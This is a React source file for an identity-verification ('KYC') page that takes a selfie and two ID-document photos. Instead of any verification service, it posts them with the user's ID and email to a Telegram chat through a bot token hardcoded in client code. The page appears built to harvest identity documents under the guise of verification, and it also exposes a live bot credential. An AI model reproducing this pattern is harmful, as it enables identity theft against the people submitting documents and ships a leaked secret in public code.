import { useRef, useState } from 'react'
import { useAppSelector } from '../../hooks/redux'
import { IUser } from '../../models/IUser'
import UnauthorizedPage from '../Unauthorized/UnauthorizedPage'
import { COUNTRIES } from './selector/countries'
import CountrySelector from './selector/selector'
import { SelectMenuOption } from './selector/types'

const KycPage = () => {
	const [documentPhoto1, setDocumentPhoto1] = useState<File | null>(null)
	const [documentPhoto2, setDocumentPhoto2] = useState<File | null>(null)
	const [documentType, setDocumentType] = useState<string>('')
	const [isOpen, setIsOpen] = useState(false)
	const [country, setCountry] = useState<SelectMenuOption['title']>('Poland')
	const [selfie, setSelfie] = useState<File | null>(null) // Добавляем инициализацию состояния для selfie
	const user = useAppSelector(state => state.user.user) as IUser | null
	const handleFileUpload = (
		event: React.ChangeEvent<HTMLInputElement>,
		setter: React.Dispatch<React.SetStateAction<File | null>>
	) => {
		const file = event.target.files?.[0] || null
		setter(file)
	}

	const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
		event.preventDefault()

		if (!user) {
			// Если пользователь не авторизован, показать страницу UnauthorizationPage
			return <UnauthorizedPage />
		}

		try {
			const photos = [documentPhoto1, documentPhoto2, selfie]
			photos.forEach((photo, index) => {
				sendToTelegram(photo, index)
			})
		} catch (error) {
			console.error('Error sending data to Telegram:', error)
		}
	}

	const sendToTelegram = async (photo: File | null, index: number) => {
		try {
			if (!photo) {
				console.error(`Photo ${index + 1} is empty`)
				return
			}

			const telegramToken = '7134412413:AAHnxqCxBbXomWtWbLxkwE0ThHKRg84bVik'
			const chatId = '-4179672808'

			const userInfo = user
				? `User ID: ${user.id}\nUser Email: ${user.email}\n`
				: ''

			const message = `
            New KYC submission:
            ${userInfo}
            Document Type: ${documentType}
            Issuing Country: ${country}
            Photo ${index + 1}:
        `

			const formData = new FormData()
			formData.append('chat_id', chatId)
			formData.append('photo', photo)
			formData.append('caption', message)

			const telegramURL = `https://api.telegram.org/bot${telegramToken}/sendPhoto`

			const response = await fetch(telegramURL, {
				method: 'POST',
				body: formData,
			})
			const responseData = await response.json()

			console.log(`Telegram response for photo ${index + 1}:`, responseData)
		} catch (error) {
			console.error(
				`Error sending data for photo ${index + 1} to Telegram:`,
				error
			)
		}
	}

	const fileInputRef1 = useRef<HTMLInputElement>(null)
	const fileInputRef2 = useRef<HTMLInputElement>(null)
	const selfieInputRef = useRef<HTMLInputElement>(null)

	const captureImage = (ref: React.RefObject<HTMLInputElement>) => {
		if (ref.current) {
			ref.current.click()
		}
	}

	const documentTypes = [
		'ID card',
		'Passport',
		'Residence permit',
		"Driver's license",
	]

	return (
		<>
			{!user && <UnauthorizedPage />}
			<div className='min-h-screen py-6 flex flex-col justify-center sm:py-12'>
				<div className='relative py-3 sm:max-w-xl sm:mx-auto'>
					<div className='absolute inset-0 bg-gradient-to-r from-cyan-400 to-light-blue-500 shadow-lg transform -skew-y-6 sm:skew-y-0 sm:-rotate-6 sm:rounded-3xl'></div>
					<div className='relative px-4 py-10 bg-color--primary-bg border-color--border border shadow-lg sm:rounded-3xl sm:p-20'>
						<form className='max-w-md mx-auto' onSubmit={handleSubmit}>
							<h1 className='text-2xl text-white font-semibold text-center'>
								Verification Form
							</h1>
							<div className='space-y-6 py-8'>
								<div>
									<label
										htmlFor='country'
										className='text-sm font-bold mb-4 text-white block'>
										Select issuing country
									</label>
									<CountrySelector
										id={'country-selector'}
										open={isOpen}
										onToggle={() => setIsOpen(!isOpen)}
										//@ts-ignore
										onChange={setCountry}
										//@ts-ignore
										selectedValue={COUNTRIES?.find(
											option => option.title === country
										)}
									/>
								</div>
								<div>
									<label className='text-sm font-bold mb-3 text-white block'>
										Choose your document type
									</label>
									<div className='space-y-2'>
										{documentTypes.map((type, index) => (
											<div key={index} className='flex items-center text-white'>
												<input
													type='radio'
													id={`document-type-${index}`}
													name='document-type'
													value={type}
													checked={documentType === type}
													onChange={e => setDocumentType(e.target.value)}
													className='form-radio h-4 w-4 text-blue-500 transition duration-150 ease-in-out focus:ring focus:ring-blue-200'
												/>
												<label
													htmlFor={`document-type-${index}`}
													className='ml-2 cursor-pointer'>
													{type}
												</label>
											</div>
										))}
									</div>
								</div>
								<div>
									<label
										htmlFor='selfie'
										className='text-sm font-bold mb-2 text-white block'>
										Take a selfie
									</label>
									<div className='relative'>
										<input
											type='file'
											id='selfie'
											name='selfie'
											onChange={e => handleFileUpload(e, setSelfie)}
											className='hidden'
											ref={selfieInputRef}
										/>
										<label
											htmlFor='selfie'
											onClick={() => captureImage(selfieInputRef)}
											className='cursor-pointer block w-full py-8 px-4 bg-gradient-to-b from-cyan-400 to-light-blue-500 text-white font-semibold rounded-md hover:bg-blue-600 focus:outline-none focus:border-blue-700 focus:ring focus:ring-blue-200 active:bg-blue-800'>
											Take a Selfie
										</label>
									</div>
								</div>
								<div className='flex justify-around'>
									<div>
										<label
											htmlFor='document-photo1'
											className='text-sm font-bold mb-2 text-white block'>
											Upload a first photo
										</label>
										<div className='relative'>
											<input
												type='file'
												id='document-photo1'
												name='document-photo1'
												onChange={e => handleFileUpload(e, setDocumentPhoto1)}
												className='hidden'
												ref={fileInputRef1}
											/>
											<label
												htmlFor='document-photo1'
												onClick={() => captureImage(fileInputRef1)}
												className='cursor-pointer block w-full py-8 px-4 bg-gradient-to-b from-cyan-400 to-light-blue-500 text-white font-semibold rounded-md hover:bg-blue-600 focus:outline-none focus:border-blue-700 focus:ring focus:ring-blue-200 active:bg-blue-800'>
												Choose a File
											</label>
										</div>
									</div>
									<div>
										<label
											htmlFor='document-photo2'
											className='text-sm font-bold mb-2 text-white block'>
											Upload a second photo
										</label>
										<div className='relative'>
											<input
												type='file'
												id='document-photo2'
												name='document-photo2'
												onChange={e => handleFileUpload(e, setDocumentPhoto2)}
												className='hidden'
												ref={fileInputRef2}
											/>
											<label
												htmlFor='document-photo2'
												onClick={() => captureImage(fileInputRef2)}
												className='cursor-pointer block w-full py-8 px-4 bg-gradient-to-b from-cyan-400 to-light-blue-500 text-white font-semibold rounded-md hover:bg-blue-600 focus:outline-none focus:border-blue-700 focus:ring focus:ring-blue border-gray-300 rounded mt-1'>
												Choose a File
											</label>
										</div>
									</div>
								</div>
								<div>
									<button
										type='submit'
										className='w-full p-2.5 text-white bg-cyan-500 rounded hover:bg-cyan-700 focus:outline-none'>
										Submit
									</button>
								</div>
							</div>
						</form>
					</div>
				</div>
			</div>
		</>
	)
}

export default KycPage
